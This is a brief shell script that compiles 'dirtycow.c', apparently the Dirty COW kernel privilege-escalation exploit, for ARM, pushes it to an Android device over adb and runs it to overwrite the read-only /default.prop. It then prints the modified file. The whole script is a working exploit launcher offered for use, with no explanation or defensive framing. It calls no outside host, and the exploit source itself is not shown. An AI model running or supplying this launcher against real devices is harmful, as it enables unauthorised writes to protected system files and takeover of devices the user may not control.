#!/bin/sh
echo
echo "Create and push bynary"
arm-linux-gcc-4.4.3/bin/arm-linux-gcc dirtycow.c -pthread -static -o dirtycow
adb push dirtycow /data/local/tmp/dirtycow
adb shell ls -l /data/local/tmp/dirtycow
echo
echo "Start......"
adb shell /data/local/tmp/dirtycow /default.prop data/local/tmp/default.prop
echo
echo "Result default.prop:"
adb shell ls -l /default.prop
echo "content:"
adb shell cat /default.prop
echo
